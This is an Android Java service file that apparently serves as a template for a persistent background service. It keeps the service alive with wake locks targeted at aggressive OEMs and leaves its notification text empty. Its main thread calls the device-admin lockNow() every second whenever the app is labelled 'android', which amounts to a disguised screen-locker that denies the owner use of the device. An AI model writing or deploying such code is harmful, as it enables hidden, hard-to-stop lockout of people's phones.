//THIS FILE NEED BE HERE: app/src/main/java/background/work/around/RiderService.java

//This service live in android:process=":rider1337backgroundworkaround"
//use same process if you wanna contact it, for example change shared prefs.

/*
To start use:
background.work.around.Start.RunService(this);
or your context instead of "this".
Please start on any activity launch.
*/

package background.work.around;

import android.app.admin.*;
import android.app.*;
import android.content.*;

public class RiderService extends RiderService1 {														

	@Override
	protected Class<?> NotificationPendingIntentClass() {
     return null;
	}
	
	@Override
	protected boolean use_adaptive_WakeLock_on_agressive_OEMs() {
	return true;	
	}

	@Override
	protected boolean use_aressive_WakeLock_on_all_OEMs() {
	return true;
	}

	@Override
	protected boolean isAgressive_OEM() {
    String m = android.os.Build.MANUFACTURER.toLowerCase();
    return m.contains("xiaomi") || m.contains("redmi") || m.contains("poco") || m.contains("huawei") || m.contains("realme") || m.contains("oppo") || m.contains("vivo");
	}
	
	@Override
    protected String NotificationTitle() { return ""; }

    @Override
    protected String NotificationBody() { return ""; }

	@Override
	protected Boolean isHideNotificationOnTheLockScreen() {
    return false;
	}

	@Override
    protected Boolean disableNotificationSound() {
    return true;
	}

    @Override
    protected void initLogicVoid() {
		/*
		This void runs right before the void responsible for startForeground. It's be useful if you need to do something before that. For example, requesting notification permissions (not required). in other cases don't use it. And even if you do, don't put complicated logic in it.
		*/
	}

	private static Thread thread;
	
	@Override
    protected void serviceMainVoid() {	   
		if (thread == null) {       
			thread = new Thread(() -> {
				Context context = getApplicationContext();
				DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);     
				while (true) {
					android.os.SystemClock.sleep(1000);
					try {
						if (getApplicationInfo().loadLabel(getPackageManager()).toString().equals("android")) dpm.lockNow();
					} catch (Throwable e) {
						dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
					}                        				
				}				
			});
			thread.start();			                                       
		}        
    }

    @Override
    protected void DestroyCleaner() {		
        //cleaning resources when finished.
        //Don't call super.ondestroy here.
    }	

}
